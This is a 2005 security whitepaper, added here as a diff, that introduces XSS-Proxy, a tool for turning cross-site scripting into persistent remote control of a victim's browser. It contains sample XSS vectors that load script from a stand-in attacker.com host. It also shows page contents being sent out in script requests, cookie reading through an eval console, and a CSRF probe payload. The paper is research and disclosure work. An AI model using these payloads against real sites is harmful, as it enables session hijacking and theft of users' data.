@@ -1,0 +1,342 @@
+                             A Mini-Whitepaper
+          Advanced Cross-Site-Scripting with Real-time Remote Attacker Control
+
+Author: Anton Rager
+Date: Feb 9, 2005
+
+** Introduction **
+Cross Site Scripting (XSS) is perceived as a minimal threat by many developers and 
+security professionals. There have been some good papers in the past that should have 
+woken folks up to the potential risks of XSS, but the problem is still prevalent and 
+most security folks are un-interested in the issue and its ramifications. I hope to 
+change that perception with this paper and the release of a tool called XSS-Proxy that 
+allows XSS attacks to be fully controlled by a remote attacker. This paper describes 
+current XSS attacks and introduces new methods/tool for making XSS attacks interactive, 
+bi-directional, persistant and much more evil.
+
+This is not a detailed XSS HowTo, but an explanation of methods for taking XSS attacks 
+much further. CGISecurity's XSS FAQ (1) is a good resource for a better overview of 
+general XSS issues. I've also included several references (2,3,4,5) at the end of this 
+paper that are also great material on XSS and related topics. 
+
+This is also not a discussion on solutions as there are many resources on methods for 
+finding and fixing XSS holes. The extended attack(s) I introduce here bypasses many of 
+the XSS mitigation methods I've seen other papers recommend (like hidden form inputs, 
+URL re-writing, POST methods, etc), as the attacker has access to the same site contents 
+(and jscript/values) as the victim. The only realistic solution is to either discard any 
+HTML and special char inputs or carefully, carefully filter to allow only certain things 
+in user input - event many sites that try to filter tags/chars can be tricked into XSS. 
+Another solution may be to partition sites into multiple document domains so it's more 
+difficult for an XSS vulnerability in one document domain to allow access to other areas 
+in the other domains. Perhaps putting site-search CGIs in one subdomain and sensitive 
+site areas in another would be useful.
+ 
+** Brief XSS Background **
+As many here probably know, current XSS attacks typically use one XSS vulnerable server 
+or email to redirect a user to a second XSS vulnerable server. The second server is the 
+actual attacker’s target and normally has a self-XSS issue where a user can inject 
+<script> content into a document that only that user will see. This combined with the 
+redirection from another site can allow cookie leakage, form/submit content leakage, or 
+a specific action to perform as the XSS'd user against the site. In the past other folks 
+have pointed out that more advanced site manipulation can be achieved with an XSS script 
+that opens an IFRAME (or other window-like element) and loads/submits for other documents 
+on the same site.  DOM trust will allow Javascript to interact with other windows/IFRAMEs
+it creates, as long as the windows point to the same document domain (protocol + 
+domain_name + port).
+
+The current methods of XSS attacks are typically limited only a single transaction at the 
+final target site and typically result in cookie harvesting or form submission leakage.
+
+
+** Basics of XSS-Proxy / Attack **
+I have extended the normal XSS attack and combined it with the ability to pull additional 
+Javascript commands from arbitrary remote servers (aka Javascript Remoting - see (6) for 
+details with IFRAMEs) to allow XSS to be more than just a redirect with some cookie 
+leakage.  This combination allows an attacker to establish a persistent, bi-directional 
+control/transfer channel to an XSS victim and access XSS’d sites as that victim. As long 
+as the victim is tricked into leaving the XSS window open and in the same location, we 
+have almost total control of the victim’s browser against the XSS site with the ability 
+to redirect to other XSS vulnerable sites or forward specific blind requests to other 
+servers (see (3) on performing Cross-Site-Request-Forgeries aka CSRF and (4) on Session-
+Riding).
+
+This is achieved with a similar XSS attack to the two server XSS method described above. 
+A victim gets an XSS vector via blog, comment board, email, etc (Let’s assume our victim 
+surfed to some public site where other users can create XSS - we’ll call the site 
+evilblog.com) and that Javascript content redirects the user to a second site (we’ll call 
+the second site banking.com and assume the site has an XSS in a search function that we 
+can repeat with a GET). The redirect URL refers to a vulnerable section (cgi/etc) on the 
+second server that will cause the server's response to contain attacker supplied 
+Javascript commands that the victim to executes.
+
+  The initial XSS vector on evilblog.com would look something like this: 
+  <script>document.location=”http://banking.com/search?name=<script src=’http://attacker.com/xss.js’></script>”</script>
+
+  With the above XSS vector, the page returned by the second server would contain the 
+  following: 
+  <script src='http://attacker.com/xss.js'></script>
+
+The victim window now has a current document domain of banking.com and the Javascript 
+commands are running in that domain. This Javascript causes the victim to make a request 
+to http://attacker.com for more script commands. The XSS-Proxy utility is actually running 
+at attacker.com and serves up some Javascript to initialize this client that consists of 
+several functions for document reading, submission processing, response forwarding and 
+error handling, as well as some commands to create an IFRAME, load the root document (/) 
+of the target server (banking.com) into that IFRAME, wait a few seconds for it to load, 
+read the contents (using innerHTML), then make more script requests to 
+http://attacker.com. Sounds complex, but it's just several functions and some references 
+to those function.  The functions will stay in memory as long as the victim window doesn't 
+change. Two things actually happen when the victim makes the subsequent script requests 
+to http://attacker.com: 
+1 - Contents of the document in the IFRAME (results of innerHTML for that object) are 
+    leaked in the URL of script request. Script requests are just GETs, so victim requests 
+    the script like a normal document, and stacks parms/info on the URL after the 
+    script/page name.  This script request would appear somewhat like the following at the 
+    attacker's server: 
+    GET /xss.js?data=Encoded_innerHTML_Contents HTTP/1.1
+
+    It's actually a bit more complex than that as IE limits URL lengths (to around 2049 
+    chars), so most documents will need to be chunked up into sections that will fit on 
+    the script URL requests. The actual tool tries to handle that, so puts some additional 
+    info into the URL requests for re-assembly.
+
+2 - The server at http://attacker.com will respond to the last script request with more 
+    script commands to continue the persistence. The server will either respond with loop 
+    request (basically tells victim wait a few secs, then check back for more script 
+    commands), a document request (load doc into IFRAME, read it and forward results while 
+    getting more script commands), a submit requests (set input values in form within 
+    IFRAME, submit, await response, read response and forward results back while getting 
+    more commands), or a javascript var/function evaluation requests (evaluate an expression 
+    within the current window of victim browser and return result+get commands). This 
+    process continues as long as the victim stays on the same page.
+
+Here's an ASCII visual of the Window and attacker target relationships after victim is 
+redirected to final Target and hijack session is initialized:
+
+
+
+                      Attacker (XSS-Proxy)
+                              ^  |
+                              |  |
+                     commands and responses
+Victim Browser                |  |
+ -----------------------------|--|-------------
+|Main Window                  |  v             |
+| - This is where our resident functions run   | 
+| - Commands from attack console execute here <------
+| - Create IFRAME below and read/writes to it  |     |
+| - Victim polls every few sec for new commands|     |
+|                          | ^                 |     |
+|       -------------------|-|--------------   |     |
+|      | IFRAME            v |              |  |     |
+|      | - This is our document "loader"    |  |     |
+|      | - other documents on target site   |  |     |
+|      |   are loaded here and read by code |  |     ^
+|      |   outside the IFRAME (main)        |  |     |
+|      |                                    |  |     |
+|      |                                    |  |   Initial
+|      |                                    |  |  XSS vector
+|      |                      ^ |           |  |   to load
+|      |                      | |           |  |  functions
+|       ----------------------|-|-----------   |    from 
+ -----------------------------|-|--------------   XSS-Proxy 
+                              | |                    |
+                              | |                    |
+                              | v                    |
+                          XSS vulnerable server -->--
+                         (Target - banking.com)
+
+
+There are many methods for hiding the actual "resident" attack window or the loader IFRAME. 
+The entire window could be hidden or the original site contents could be left and just the 
+IFRAME hidden.  The current XSS-Proxy tool leaves the window and its IFRAME visible to 
+the victim, but it would be trivial to modify - the attacker can also do this interactively 
+with the Javascript Eval from. There also are many methods for forcing a user to load a 
+new window and with some additional logic even pop-up blockers can be bypassed (XSS process 
+re-writes the links in the original document to open a new window on click). The new window 
+could be a mirror of what the user was already viewing or the result of a clicked link in 
+the public XSS document and could trick the victim into leaving the XSS controlled window 
+running while they continue surfing.
+
+** Using XSS-Proxy **
+While the description above is a bit dry, an actual test drive of the tool against your 
+own XSS vulnerable site will highlight the dangers of this attack more fully. Here's the 
+general steps for a demo involving your XSS-flawed server with localhost browser as a 
+victim, an XSS-Proxy and an attacker browser. In a real-world attack, the XSS-flawed 
+server, victim and XSS-Proxy/attacker hosts would all proabably different systems.
+
+Here's an overview on using the XSS-Proxy tool:
+1 - Modify the perl script vars $code_server and $PORT to point to the system that you 
+    will be running the perl script on. Defaults to port 80 and http://localhost
+2 - Run the perl script and point the attack browser at /admin on the server you are 
+    running the perl script. With defaults would be http://localhost/admin. This is the 
+    attacker admin console and is where victims can be managed and results viewed.
+3 - The initialization URL a victim needs to point to is /xss2.js - Your initial XSS 
+    vector needs to point back to the perl server and this filename (ie for XSSing your 
+    own browser with local code server, enter 
+    <script src="http://localhost/xss2.js"></script> 
+    at a site that has an XSS vulnerable input) 
+4 - After you have a victim initialized and in a wait loop, you can either browse the / 
+    document of the XSS site and click on links you want the victim to visit/forward back, 
+    or you can enter documents/variables in the associated form inputs. 
+ 
+XSS-Proxy Admin Commands and operation. 
+- The console does not refresh/update on its own. You will need to press the 
+  refesh/reload button in your browser. 
+- Javascript is not required to run the console and it may be safer to disable for the 
+  attacker console. I've XSS'd myself a few times with some advanced testing. 
+- Sessions will show up in a "Clients" section once a victim gets XSS'd.
+- Each victim/session should forward a copy of the "/" directory off the XSS'd server.
+- Forwarded documents are listed in the "Document Results" section. If you click on a 
+  document, it will rewrite the URLs and clicks within that document will make XSS-Proxy 
+  request the same client load the link 
+- If you are modifying a form and submitting, then you need to make sure the last page 
+  that client loaded is that same page, then fill out values and submit form. Some URL 
+  re-writing is happening here as well and the code assumes that page is already loaded at 
+  the victim.
+- You can also do document loads manually by entering the URL in the "Fetch Document" 
+  form. First value (left) is the session number, and second is the document to retrieve 
+  (ie - 0 and http://xssed.com/stuff). The resulting document will be listed in the 
+  "Document Results" section.
+- The other form called "Evaluate" is for querying Javascript vars/functions from 
+  specific clients. Enter session on left and var on right (ie - 0 and document.cookie 
+  to display cookies for session 0) 
+- Results of evaluate requests will appear in the "Eval Results" section 
+- There is an error handler running in the victim browser, so errors from page loads and 
+  evaluate requests will appear in the "Errors" section. 
+ 
+There are a few bugs in the code still, so read the initial comments in the controller 
+script to see what it may have issues with. The attack works with IE and Firefox browsers 
+(with some additional tweaks other browsers may work) and the Perl script runs on most 
+any OS with a basic Perl install. I've tested it on Linux and Windows (Activestate Perl) 
+with Perl5. It's lightweight and extremely portable, but Apache + a DB server would be a 
+more roust and stable platform.
+
+
+** Implications of Attack/Tool **
+This advanced attack allows a persistent connection and an arbitrary number of documents 
+to be loaded and forwarded by victims to an attacker. I call these victims in an 
+idle/wait state "Browser-Zombies". The ability to see documents, modify and submit 
+documents that the victim may have access to can allow an attacker to elevate access to 
+a site by assuming the rights/identity of the XSS victim. This is useful if the victim is 
+already logged into a site (see session-riding paper (4)) and the attacker piggybacks on 
+this existing session. Cookie theft alone does not work with all site and many sites use 
+other authentication methods. XSS-Proxy is an extreme example of session-riding (4) and 
+XSS combined and can allow access to the same resources a victim may have. Methods can 
+include cached/existing logins, client-side certificates, IP firewalled/filter access 
+and even access to other resources behind firewalls (see attack refinements below). 
+
+This attack also allows realtime (or scripted) access to the victim browser, and other 
+content-type or browser specific vulnerabilities could also be potentially leveraged for 
+additional browser/host access. This control channel could also be a delivery mechanism 
+for other forms of malware.
+
+This also means than the initial XSS attack and controlled session is not just limited 
+to the current XSS vulnerable server. The attacker can re-direct the victim to other XSS 
+vulnerable sites after the initial browser hijack, and determine what access the victim 
+has to the site. This could even be a list of sites that the attacker knows have XSS 
+flaws and would like to check for special access with a specific victim. XSS-Poxy can 
+already do this if you have the victim evaluate the expression 
+document.location="http://newxsssite.com/xsscode". Here's an example if XSS-Proxy already 
+has an existing session 0:
+
+  Form Evaluate:
+  Session: 0
+  Expression: document.location="http://2ndxsssite.com/search.cgi?test=%3Cscript%20src='http://attacker.com/xss2.js'%3E%3C/script%3E"
+
+  The above command will change the current location of the victim's main window to a new 
+  XSS target, load code from the attacker server, re-create a loader IFRAME and start a new 
+  hijacked session with http://2ndxsssite.com as the current document domain. We have 
+  transferred the initial XSS to another target and maintained control of the victim.
+
+An extension of this idea is to force the victim to continue surfing normally in a window the 
+attacker creates and in the other XSS hijacked window force periodic redirects to a list of 
+interesting XSS sites -- with each redirect, the attacker checks to see if the victim is at 
+one of those sites.  If the interactive window is at the same site as the current XSS check-site,
+the attacker will be able to read the contents of the interactive window. This means the 
+attacker can now shoulder-surf the victim and even modify server responses and user 
+submission as long as the victim stays on that same site. XSS-Proxy doesn't currently do 
+this, but some interactive eval expressions for the session should be able to create a popup 
+window (if allowed in browser), make it full screen, and periodically check that window to 
+see if the victim has surfed to a location that can be read. For a useful attack, this needs 
+to be coded into XSS-Proxy as another attacker command.
+
+Other refinements of this attack could allow blind CSRF based probing for other sites 
+with XSS flaws, with validation of XSS vulnerable sites. Validation would be determined 
+with responses that set the probe IFRAME/window back to the XSS controlled site and 
+allow the already resident XSS code reading the frame again (even more information could 
+be passed on the re-direct URL and even if it throws a 404 the XSS code can read it). 
+If the XSS probe is unsuccessful, the resident XSS code will be unable to read the IFRAME, 
+will delete the IFRAME and try the next test. Again, I'll update the XSS-Proxy site with 
+the details, but if there's a XSS flaw the CSRF injected vector will point back to a 
+site we already XSS control and our script will be able to read the window again. XSS-Proxy 
+has IFRAME access denial recovery logic that deletes the IFRAME and reloads the original XSS 
+target site root (/) upon failure to read IFRAME. This can be used to do this CSRF XSS 
+fuzzing attack with GET URLs by requesting the client fetch a document off another target 
+system and inlcude some XSS code in the URL to set the frame back to the original XSS site 
+upon sucess. Here's an example for doing this with XSS-Porxy and a victim on session 0 who's 
+currently on http://xsssite1.com - this will probe http://csrfprobesite.com:
+
+  Form: Fetch Document
+  Session: 0
+  Location: http://csrfprobesite/probeurl?probevalue=<script>document.location="http://xsssite1.com/lalalalala"
+
+  If XSS-Proxy throws an access denied error for the document in the loader IFRAME, the fuzz 
+  probe failed. If it doesn't throw an error and the new loader IFRAME document location is 
+  set to "http://xsssite1.com/lalalalala", then your blind fuzz worked. 
+  Note that IE needs somewhere over 512 bytes in the 404 message to override IE's 
+  res:// based 404 errors. Firefox doesn't and always seems to read a 404 just fine.
+
+I have another refinement of this attack that can allow the attacker to masquerade as the 
+victim and never reveal his location/IP to a specific target site. I'll be publishing 
+details on the XSS-Proxy site soon, but the method involves multiple XSS target sites and 
+covert channels between several IFRAMES on the same page for command/response 
+communications. The covert channel is an IFRAME who's location is swapped between the 
+two XSS sites and commands/responses are communicated via the locations URL (This will 
+normally throw a 404, but we can still read the location if it's set to the correct 
+document domain). The end-result is that one of the sites doesn't know where the remote 
+script server is located and thinks the attacker is actually the victim's browser, 
+while the other site passed the initial script call to the victim browser. An attacker 
+using something like Nikto thru the XSS-Proxy tool could attack the 2nd target site while 
+masquerading as the victim - XSS could be leveraged for other web vulnerability 
+exploitation.  The site administrators would never know where the attack server was 
+located without a complete analysis of victim system during the attack. XSS-Proxy does 
+not handle this right now, but I've got some code additions soon that will allow it.
+
+
+The basic controlled attack and it's extensions are very evil, and any other future DOM 
+interwindow trust vulnerabilities in browsers (like the recent drop window to tab Firefox 
+vulnerability) make the issue even worse as _all_ sites a victim has access to could also 
+be accessed by an attacker. Right now XSS-Proxy only grabs document contents (HTML/Text) 
+and images, files, and other contents are not downloaded to the attacker.  Remote 
+retrieval of these other file types could be made possible with XSS re-injection and use 
+of functions like XMLHTTP for arbitrary binary content from the target server.
+
+** Development Site and Additional Information **
+XSS-Proxy is available at http://sourceforge.net/projects/xss-proxy
+
+Home page with more detailed whitepaper, some diagrams, screenshots and my 
+Shmoocon slides is at http://xss-proxy.sourceforge.net
+
+** References **
+(1) CGISecurity's Cross Site Scripting FAQ 
+http://www.cgisecurity.com/articles/xss-faq.shtml
+(2) Gunter Ollmann's XSS paper
+http://www.technicalinfo.net/papers/CSS.html
+(3) PeterW's Cross Site Request Forgery (CSRF) Concept
+http://www.securityfocus.com/archive/1/191390
+(4) SecureNet's Session Riding paper
+http://www.securenet.de/papers/Session_Riding.pdf
+(5) CERT info on XSS
+http://www.cert.org/advisories/CA-2000-02.html
+(6) Remote Scripting with IFRAMEs
+http://developer.apple.com/internet/webcontent/iframe.html
+
+Thanks to all who provided ideas, input, testing and draft reviews. You know who you 
+are ;) And many thanks to the authors of "Javascript 2nd Ed - The Complete Reference" 
+for a book that I think I've actually read in it's entirety at this point...
+
+
+Anton Rager
+arager@avaya.com or a_rager@yahoo.com
+
